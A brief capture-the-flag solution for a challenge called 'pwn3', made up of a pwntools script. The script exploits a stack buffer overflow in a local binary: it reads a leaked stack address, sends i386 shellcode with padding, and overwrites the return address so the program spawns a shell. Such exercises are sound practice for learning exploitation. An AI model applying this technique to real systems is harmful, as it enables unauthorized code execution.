---
title: "pwn3"
points: N/A
tags: ["pwn"]
---

```python
from pwn import *

binary_name = "./pwn3"
elf = context.binary = ELF(binary_name)
DEBUG = True

if DEBUG:
p = gdb.debug(binary_name, '''
break *echo+56
continue
''')
else:
p = process(binary_name)

sh = asm(shellcraft.i386.linux.sh())
addr = p.recv().decode().rstrip('!\n').split()[-1]
p.sendline(sh + b'a'*(302-len(sh))+p32(int(addr,16)))

p.interactive()
```